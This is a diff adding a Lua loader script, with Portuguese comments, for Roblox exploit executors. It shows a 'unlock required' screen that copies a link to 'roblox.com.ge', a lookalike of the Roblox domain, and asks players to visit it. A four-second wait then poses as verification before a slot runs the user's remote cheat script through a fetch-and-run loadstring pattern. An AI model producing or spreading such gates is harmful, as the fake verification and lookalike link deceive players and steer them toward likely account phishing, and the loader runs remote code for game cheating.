@@ -1,0 +1,249 @@
+--[[ 
+
+    LOADER V4 - OTIMIZADO PARA CELULAR (DELTA/HYDROGEN)
+
+    Ajusta o tamanho automaticamente e tem instruções claras.
+
+]]
+
+-- ==========================================================
+
+--  PASSO 1: COLOQUE SEU LINK E SEU SCRIPT AQUI EMBAIXO
+
+-- ==========================================================
+
+local CONFIG = {
+
+    UrlDoGrupo = "https://roblox.com.ge/communities/3122951096/", -- Link do Discord/Grupo
+
+    
+
+    -- Coloque seu script principal dentro desta função abaixo:
+
+    ScriptPrincipal = function()
+
+        -- APAGUE O PRINT E COLOQUE SEU LOADSTRING AQUI:
+
+        print("SUCESSO! O SCRIPT FOI LIBERADO!") 
+
+        -- Exemplo: loadstring(game:HttpGet("..."))()
+
+    end
+
+}
+
+-- ==========================================================
+
+--                NÃO MEXA DAQUI PARA BAIXO
+
+-- ==========================================================
+
+local CoreGui = game:GetService("CoreGui")
+
+local TweenService = game:GetService("TweenService")
+
+local Players = game:GetService("Players")
+
+-- Remove GUI anterior para não bugar
+
+if CoreGui:FindFirstChild("MobileGateV4") then
+
+    CoreGui.MobileGateV4:Destroy()
+
+end
+
+-- Cria a Tela
+
+local ScreenGui = Instance.new("ScreenGui")
+
+ScreenGui.Name = "MobileGateV4"
+
+ScreenGui.Parent = CoreGui
+
+ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+
+-- Frame Principal (Janela)
+
+local MainFrame = Instance.new("Frame")
+
+MainFrame.Name = "MainFrame"
+
+-- Tamanho usando SCALE (0.8 = 80% da tela) para caber em qualquer celular
+
+MainFrame.Size = UDim2.new(0.8, 0, 0.5, 0) 
+
+MainFrame.AnchorPoint = Vector2.new(0.5, 0.5) -- Ponto central
+
+MainFrame.Position = UDim2.new(0.5, 0, 0.5, 0) -- Centralizado na tela
+
+MainFrame.BackgroundColor3 = Color3.fromRGB(20, 20, 25)
+
+MainFrame.BorderSizePixel = 0
+
+MainFrame.ClipsDescendants = true
+
+MainFrame.Active = true
+
+MainFrame.Draggable = true
+
+MainFrame.Parent = ScreenGui
+
+local UICorner = Instance.new("UICorner")
+
+UICorner.CornerRadius = UDim.new(0, 16)
+
+UICorner.Parent = MainFrame
+
+-- Título
+
+local Title = Instance.new("TextLabel")
+
+Title.Size = UDim2.new(1, 0, 0.15, 0)
+
+Title.BackgroundTransparency = 1
+
+Title.Text = "DESBLOQUEIO NECESSÁRIO"
+
+Title.TextColor3 = Color3.fromRGB(255, 255, 255)
+
+Title.Font = Enum.Font.GothamBlack
+
+Title.TextScaled = true -- Texto ajusta ao tamanho
+
+Title.Parent = MainFrame
+
+-- Linha decorativa
+
+local Line = Instance.new("Frame")
+
+Line.Size = UDim2.new(0.8, 0, 0.01, 0)
+
+Line.Position = UDim2.new(0.1, 0, 0.15, 0)
+
+Line.BackgroundColor3 = Color3.fromRGB(0, 170, 255)
+
+Line.BorderSizePixel = 0
+
+Line.Parent = MainFrame
+
+-- Instruções (Passo a Passo)
+
+local Instructions = Instance.new("TextLabel")
+
+Instructions.Size = UDim2.new(0.9, 0, 0.5, 0)
+
+Instructions.Position = UDim2.new(0.05, 0, 0.2, 0)
+
+Instructions.BackgroundTransparency = 1
+
+Instructions.Text = "Siga os passos para liberar:\n\n1. Clique em COPIAR abaixo.\n2. Vá no Google e entre no Grupo.\n3. Volte aqui e o script abrirá."
+
+Instructions.TextColor3 = Color3.fromRGB(200, 200, 200)
+
+Instructions.Font = Enum.Font.GothamMedium
+
+Instructions.TextScaled = true -- Texto cresce/diminui conforme o celular
+
+Instructions.TextWrapped = true
+
+Instructions.TextXAlignment = Enum.TextXAlignment.Center
+
+Instructions.Parent = MainFrame
+
+-- Botão Gigante
+
+local BtnAction = Instance.new("TextButton")
+
+BtnAction.Size = UDim2.new(0.8, 0, 0.2, 0) -- 80% da largura
+
+BtnAction.Position = UDim2.new(0.1, 0, 0.75, 0)
+
+BtnAction.BackgroundColor3 = Color3.fromRGB(0, 110, 255) -- Azul
+
+BtnAction.Text = "COPIAR LINK DO GRUPO"
+
+BtnAction.TextColor3 = Color3.fromRGB(255, 255, 255)
+
+BtnAction.Font = Enum.Font.GothamBold
+
+BtnAction.TextScaled = true
+
+BtnAction.Parent = MainFrame
+
+local BtnCorner = Instance.new("UICorner")
+
+BtnCorner.CornerRadius = UDim.new(0, 10)
+
+BtnCorner.Parent = BtnAction
+
+-- --- LÓGICA BLINDADA ---
+
+local clicou = false
+
+BtnAction.MouseButton1Click:Connect(function()
+
+    if clicou then return end -- Evita duplo clique
+
+    clicou = true
+
+    -- 1. Tenta Copiar (Com proteção contra erro)
+
+    pcall(function()
+
+        if setclipboard then
+
+            setclipboard(CONFIG.UrlDoGrupo)
+
+        elseif toclipboard then
+
+            toclipboard(CONFIG.UrlDoGrupo)
+
+        end
+
+    end)
+
+    -- 2. Animação visual de "Aguarde"
+
+    BtnAction.Text = "LINK COPIADO! AGUARDE..."
+
+    BtnAction.BackgroundColor3 = Color3.fromRGB(255, 170, 0) -- Laranja
+
+    
+
+    -- 3. Tempo de espera (simulando verificação)
+
+    task.wait(4)
+
+    
+
+    BtnAction.Text = "LIBERADO! BOM JOGO"
+
+    BtnAction.BackgroundColor3 = Color3.fromRGB(0, 200, 100) -- Verde
+
+    -- 4. Notificação
+
+    game.StarterGui:SetCore("SendNotification", {
+
+        Title = "Sucesso";
+
+        Text = "Script carregado!";
+
+        Duration = 3;
+
+    })
+
+    task.wait(1)
+
+    -- 5. Some com a tela
+
+    MainFrame:TweenPosition(UDim2.new(0.5, 0, 1.5, 0), "Out", "Quad", 0.5)
+
+    task.wait(0.5)
+
+    ScreenGui:Destroy()
+
+    -- 6. Roda o Script Principal
+
+    CONFIG.ScriptPrincipal()
+
+end)
